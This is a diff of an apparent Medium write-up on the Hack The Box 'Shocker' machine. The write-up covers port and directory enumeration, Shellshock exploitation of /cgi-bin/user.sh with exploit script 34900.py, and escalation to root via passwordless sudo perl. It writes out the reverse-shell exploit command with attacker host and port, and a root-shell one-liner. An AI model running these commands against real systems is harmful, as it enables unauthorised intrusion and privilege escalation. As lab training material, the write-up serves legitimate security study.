@@ -1,23 +1,16 @@
 # :game_die: Htb Shocker 51B95545379F
 
-> **Original Source:** [Htb Shocker 51B95545379F](https://infosecwriteups.com/htb-shocker-51b95545379f)
-> **Platform:** infosecwriteups.com | **Category:** `MISC`
-
 ---
 
 ## 🚀Introduction
-
 
 The Shocker machine on Hack The Box is an excellent tool to learn and exploit the Shellshock vulnerability. In this walkthrough, we will enumerate this retired machine step by step and capture the user and root flags, demonstrating a real-world example of this catastrophic exploit.
 
 ## 🔍 Enumeration
 
-
 First, we begin by scanning for open ports on the target machine.
 
-
 I assigned the IP address to the variable `$Shocker` and performed an Nmap full port scan:
-
 
 ```
 nmap -p- -T4 $Shocker
@@ -33,20 +26,15 @@ PORT STATE SERVICE
 Nmap done: 1 IP address (1 host up) scanned in 33.71 seconds
 ```
 
-
 Two ports are open:
-
 
 - Port 80 — HTTP (Apache web server)
 
 - Port 2222 — SSH
 
-
 Since web servers usually have more attack surface, I focused first on port 80.
 
-
 Next, I performed a version and service detection scan:
-
 
 ```
 nmap -sCV -p80,2222 -A -T4 $Shocker
@@ -80,22 +68,17 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 23.30 seconds
 ```
 
-
 Key findings from the scan:
-
 
 - Apache/2.4.18 running on port 80 (Ubuntu)
 
 - OpenSSH 7.2p2 on port 2222 (Ubuntu)
 
-
 Since port 80 is running a public-facing Apache web server, it offers a good opportunity for further exploration.
 
 ## 🌐 Website Enumeration
 
-
 I used WhatWeb to get additional web technology information:
-
 
 ```
 whatweb http://$Shocker
@@ -103,9 +86,7 @@ whatweb http://$Shocker
 http://10.10.10.56 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[10.10.10.56]
 ```
 
-
 Results showed:
-
 
 - Apache/2.4.18
 
@@ -113,17 +94,13 @@ Results showed:
 
 - Ubuntu Linux server
 
-
 There was no major new information here beyond what Nmap already revealed.
 
 ## 📂 Web Directory Enumeration
 
-
 To discover hidden directories and files, I used dirsearch:
 
-
 Let’s search for directories in the website.
-
 
 ```
 python dirsearch.py -u http://$Shocker
@@ -148,9 +125,7 @@ Target: http://10.10.10.56/
 Task Completed
 ```
 
-
 Results:
-
 
 - `/cgi-bin/` — 403 Forbidden
 
@@ -158,12 +133,9 @@ Results:
 
 - `/server-status/` — 403 Forbidden
 
-
 The discovery of `/cgi-bin/` caught my attention because it often contains executable CGI scripts — which are known to be vulnerable in certain versions of Apache setups.
 
-
 Since `/cgi-bin/` was interesting, I focused on searching specifically for `.sh` files:
-
 
 ```
 python [dirsearch.py](http://dirsearch.py/) -u http://10.10.10.56/cgi-bin -e sh
@@ -226,33 +198,24 @@ Target: http://10.10.10.56/
 [11:54:23] 200 - 118B - /cgi-bin/user.sh
 ```
 
-
 Key finding:
 
-
 - `/cgi-bin/user.sh` — 200 OK
-
 
 Opening `user.sh`, it only showed three lines of code, behaving similarly to the Linux `uptime` command.
 However, the presence of a `.sh` script under `/cgi-bin/` is highly suspicious and often linked to vulnerabilities.
 
 ## 🛠️ Vulnerability Research
 
-
 I used searchsploit to find known exploits related to Apache and CGI:
-
 
 ## Get CyberQuestor’s stories in your inbox
 
-
 Join Medium for free to get updates from this writer.
-
 
 Remember me for faster sign in
 
-
 Later, I tried to check for apache cgi vulnerabilities using searchsploit
-
 
 ```
 searchsploit "apache cgi"
@@ -272,17 +235,13 @@ AWStats 6.x - Apache Tomcat Configuration File Ar | cgi/webapps/35035.txt
 Shellcodes: No Results
 ```
 
-
 From the results, I spotted something important:
 
-
 - Apache mod_cgi — ‘Shellshock’ Remote Command Injection → `linux/remote/34900.py`
-
 
 This matched perfectly with the machine’s hint and service configuration. I downloaded the exploit script related to Shellshock and prepared for exploitation.
 
 ## 🛡️Shellshock
-
 
 - Type: Remote Code Execution (RCE)
 
@@ -294,17 +253,13 @@ This matched perfectly with the machine’s hint and service configuration. I do
 
 - Patched by: Various GNU Bash patches starting September 24, 2014
 
-
 Affected Systems:
-
 
 - Linux, Unix, macOS systems using vulnerable Bash versions
 
 - Any application that uses Bash to process environment variables (especially CGI scripts)
 
-
 Exploitation:
-
 
 - Publicly available exploits
 
@@ -314,16 +269,12 @@ Exploitation:
 
 ## ⚡ Exploitation
 
-
 After downloading the `34900.py` script associated with the Shellshock vulnerability, we can use it to exploit the machine.
-
 
 At line 93 of the script, I modified the target path to point to `/cgi-bin/user.sh`.
 This change allows us to trigger remote code execution through the vulnerable Bash script.
 
-
 I launched the exploit and we successfully received a reverse shell on the machine!
-
 
 ```
 python2 [34900.py](http://34900.py/) payload=reverse rhost=10.10.10.56 lhost=10.10.14.20 lport=4443
@@ -349,10 +300,8 @@ python2 [34900.py](http://34900.py/) payload=reverse rhost=10.10.10.56 lhost=10.
 shelly
 ```
 
-
 Once we obtain a shell, retrieving the user flag becomes straightforward.
 The flag is located in the `/home/shelly` directory inside the `user.txt` file.
-
 
 ```
 10.10.10.56> cd /home
@@ -366,12 +315,9 @@ user.txt
 10.10.10.56> cat user.txt
 ```
 
-
 Next, I needed to find a way to escalate privileges and capture the root flag.
 
-
 Checking sudo permissions:
-
 
 ```
 sudo -l
@@ -382,15 +328,11 @@ User shelly may run the following commands on Shocker:
 (root) NOPASSWD: /usr/bin/perl
 ```
 
-
 The user shelly has passwordless sudo access to Perl — a great privilege escalation opportunity!
-
 
 I referred to [GTFOBins](https://gtfobins.github.io/) and found a way to exploit this.
 
-
 Using Perl to spawn a root shell:
-
 
 ```
 sudo perl -e 'exec "/bin/sh";'
@@ -398,9 +340,7 @@ sudo perl -e 'exec "/bin/sh";'
 root
 ```
 
-
 ✅ We now have a root shell! Let’s go to the /root and print the contents in the root.txt file
-
 
 ```
 10.10.10.56> cd /root
@@ -408,18 +348,12 @@ root
 root.txt
 ```
 
-
 ```
 10.10.10.56> cat root.txt
 ```
 
-
 🎉 That’s it — we owned both user and root flags successfully and finished the machine.
-
 
 Let’s continue learning and hacking together. Stay tuned for more writeups!
 
 ---
-
-*Originally published on [Medium](https://infosecwriteups.com/htb-shocker-51b95545379f). All credit goes to the original author.*
-*Part of [CTF Collection](https://github.com/Hope0351/CTF-collection) — a curated archive of misc CTF writeups.*
